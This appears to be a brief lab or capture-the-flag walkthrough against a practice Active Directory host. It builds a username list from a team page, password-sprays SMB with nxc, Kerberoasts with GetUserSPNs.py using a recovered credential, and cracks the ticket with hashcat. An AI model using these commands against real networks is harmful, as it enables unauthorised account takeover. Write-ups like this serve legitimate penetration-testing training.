We can find the website and it has a list of team members:
![](attachment/9904cad169df9dd0cc19f8a2c7244a7d.png)

Now we can add this to a users.txt and bruteforce for passwords:
![](attachment/29ac41599cedbcb170997fbdeb83c43b.png)
```
nxc smb 192.168.182.21 -u users.txt -p /usr/share/seclists/Passwords/common_corporate_passwords.lst
```
Now we get the password.![](attachment/e7d90b127bbeb43a3101adc9ba3df073.png)

Now kerberoasting:
```
GetUserSPNs.py nagoya-industries.com/Fiona.Clark:Summer2023 -request
```
![](attachment/1b35220fe078063b6a54d2dc16b3ab93.png)
We can crack it with hashcat![](attachment/dcaad0d97f23e5d4c00ffcb2a72b3ebc.png)
